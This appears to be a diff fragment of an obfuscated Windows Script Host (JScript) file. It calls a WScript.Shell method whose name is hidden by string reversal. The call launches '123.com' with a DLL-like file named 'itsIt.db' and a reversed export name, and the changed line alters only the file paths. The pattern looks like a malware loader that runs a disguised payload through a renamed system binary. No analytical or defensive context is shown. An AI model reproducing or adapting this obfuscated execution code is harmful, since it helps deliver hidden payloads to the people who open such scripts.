@@ -15,4 +15,4 @@ function ar(id)
 }
 var sh = WScript.CreateObject("WScript.Shell");
 
-sh[reverseString(ar(1))]("123.com itsIt.db,"+reverseString(ar(3)))
+sh[reverseString(ar(1))]("me\\123.com me/itsIt.db,"+reverseString(ar(3)))
